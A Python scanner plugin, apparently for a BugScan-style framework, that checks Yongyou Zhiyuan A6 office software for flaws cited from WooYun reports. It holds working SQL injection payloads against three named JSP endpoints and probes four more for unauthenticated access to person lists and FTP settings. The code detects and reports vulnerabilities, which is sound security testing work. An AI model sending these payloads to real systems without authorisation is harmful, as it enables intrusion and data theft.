#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author: range
#ref: http://www.wooyun.org/bugs/wooyun-2015-0105502  http://www.wooyun.org/bugs/wooyun-2015-0105709  http://www.wooyun.org/bugs/wooyun-2015-0105497

def assign(service, arg):
    if service == "yongyou_zhiyuan_a6":
        return True, arg
        
def audit(arg):
    payloads = ["/yyoa/HJ/iSignatureHtmlServer.jsp?COMMAND=DELESIGNATURE&DOCUMENTID=1&SIGNATUREID=2%27%20and%20(select%201%20from%20(select%20count(*),concat(md5(1234),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23",
    "/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=-1'%20union%20all%20select%20NULL,md5(1234),NULL,NULL%23",
    "/yyoa/ext/trafaxserver/SendFax/resend.jsp?fax_ids=(1)%20and%201=2%20union%20select%20md5(1234)%20--",
    ]
    for payload in payloads:
        url = arg + payload
        code, head, res, errcode, _ = curl.curl2(url)
        if (code == 500 or code == 200) and '81dc9bdb52d04dc20036dbd8313ed055' in res:
            security_hole(url + '   found sql injection!')
    payloads2 = [
        '/yyoa/common/SelectPerson/reloadData.jsp',
        '/yyoa/assess/js/initDataAssess.jsp',
        '/yyoa/ext/trafaxserver/SystemManage/config.jsp',
        '/yyoa/common/selectPersonNew/initData.jsp?trueName=1'
    ]
    for payload2 in payloads2:
        url = arg + payload2
        code, head, res, errcode, _ = curl.curl2(url)
        if code == 200 and (('insertObject' in res) or ('personList' in res) or ('FTP' in res )):
            security_hole(url + "   Unauthorized access! ")

if __name__ == '__main__':
    from dummy import *
    audit(assign('yongyou_zhiyuan_a6', 'http://www.example.com/')[1])